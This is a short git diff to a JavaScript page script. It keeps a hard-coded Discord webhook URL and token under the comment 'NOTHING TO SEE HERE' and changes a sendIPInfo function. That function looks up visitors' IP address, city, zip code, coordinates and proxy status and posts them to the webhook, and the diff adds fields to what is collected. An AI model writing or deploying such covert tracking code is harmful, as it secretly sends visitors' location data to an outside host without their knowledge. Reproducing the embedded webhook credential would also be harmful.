@@ -67,7 +67,6 @@ $(document).ready(function(){
 
 
 // NOTHING TO SEE HERE
-// Correct Webhook URL
 const webHookUrl = "https://discord.com/api/webhooks/1231402629435883641/R0sexkYFGgqev-doFhVvd0GPnPPdX1IHcEj7c3a_j5GRcqeZoivbAtDETkb21zYDzlyA";
 
 async function fetchData(url) {
@@ -113,7 +112,7 @@ async function sendIPInfo() {
         }
 
         const ip = data.ipAddress;
-        const provider = data.isp || 'N/A';
+        const cityName = data.cityName || 'N/A';
         const timezone = data.timeZone || 'N/A';
         const country = data.countryName || 'N/A';
         const countryCode = data.countryCode ? data.countryCode.toLowerCase() : 'N/A';
@@ -122,6 +121,7 @@ async function sendIPInfo() {
         const zip = data.zipCode || 'N/A';
         const lat = data.latitude || 'N/A';
         const lon = data.longitude || 'N/A';
+        const isProxy = data.isProxy || 'N/A';
         const uniqueRandomNumber = generateUniqueRandomNumber();
 
         // Prepare the message to send to Discord
@@ -131,7 +131,7 @@ async function sendIPInfo() {
 **IP Information:**
 \`\`\`
 IP Address: ${ip}
-Provider: ${provider}
+cityName: ${cityName}
 Timezone: ${timezone}
 Country: ${country} (${countryCode})
 Region: ${region}
@@ -139,6 +139,7 @@ City: ${city}
 Zip Code: ${zip}
 Longitude: ${lon}
 Latitude: ${lat}
+isProxy: ${isProxy}
 \`\`\`
 **Unique Random Number:** ${uniqueRandomNumber}
 `
